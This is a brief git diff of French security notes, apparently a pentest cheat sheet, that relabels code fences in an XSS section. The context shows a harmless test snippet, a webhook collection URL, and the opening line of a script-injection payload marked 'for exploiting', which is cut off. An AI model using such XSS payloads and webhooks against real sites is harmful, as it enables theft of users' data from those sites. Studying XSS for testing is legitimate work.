@@ -12,7 +12,7 @@ Outil pour requêter une API : https://reqbin.com/
 
 ## XSS
 
-```js
+```html
 // Pour tester
 <p id="p1">Testarossa</p>
 <script>
@@ -21,7 +21,7 @@ document.getElementById("p1").innerHTML = "Life found a way !";
 ```
 
 Webhook : https://busterbaxter.requestcatcher.com/
-```js
+```html
 // Pour exploiter
 <script>
 var script = document.createElement("script");
